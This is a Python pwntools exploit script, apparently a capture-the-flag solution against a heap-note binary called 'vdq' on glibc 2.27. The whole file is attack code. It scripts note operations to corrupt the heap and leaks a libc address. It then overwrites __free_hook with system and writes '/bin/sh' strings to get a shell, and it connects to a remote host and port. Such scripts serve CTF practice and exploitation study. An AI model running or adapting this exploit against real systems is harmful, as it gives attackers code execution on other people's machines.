#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

operations = "["

def Add():
    global operations
    operations += "\"Add\", "

def Remove():
    global operations
    operations += "\"Remove\", "

def Append():
    global operations
    operations += "\"Append\", "

def View():
    global operations
    operations += "\"View\", "

def Archive():
    global operations
    operations += "\"Archive\", "

def DoOperations():
    sh.sendlineafter("!", operations[:-2] + "]")
    sh.sendline("$")

def DoAdd(message):
    sh.sendlineafter("message :", message)

def DoAppend(message):
    sh.sendlineafter("message :", message)

sh = process("./vdq")
libc = ELF("./libc-2.27.so")
sh = remote("120.77.10.180", 34927)
#gdb.attach(sh, """
#b * 0x555555554000 + 0xDFAF
#c
#b * 0x555555554000 + 0xDD04
#""")


Add()
Add()
Archive()
Add()
Archive()
Add()
Add()
View()
Remove()
Remove()
Remove()
View()
for i in range(0, 31):
    Add()
for i in range(0, 20):
    Archive()
for i in range(0, 10 + 1):
    Add()
View()
Remove()
for i in range(31):
    Remove()
Append()
for i in range(9):
    Add()
DoOperations()

DoAdd('A' * 0x80)
DoAdd('B' * 0x80)
DoAdd('C' * 0x420)
DoAdd('D' * 0x80)
DoAdd('E' * 0x80)
sh.recvuntil("Removed note [5]\n")
sh.recvuntil("Cached notes:\n")
sh.recvuntil("->")
sh.recvuntil("-> ")
libc_base_list = list(sh.recv(12)[::-1])
for i in range(0, 6):
    tmp = libc_base_list[2 * i + 1]
    libc_base_list[2 * i + 1] = libc_base_list[2 * i]
    libc_base_list[2 * i] = tmp
libc_base_str = ''.join(libc_base_list)
libc_base = int(libc_base_str, 16) - libc.sym["__malloc_hook"] - 0x10 - 0x60
log.success("libc_base: " + hex(libc_base))
for i in range(0, 31):
    DoAdd('')

for i in range(0, 11):
    DoAdd('')

__free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base + libc.sym["system"]
DoAdd(p64(__free_hook))

for i in range(0, 7):
    DoAdd('/bin/sh\x00')
DoAdd(p64(system))


sh.interactive()
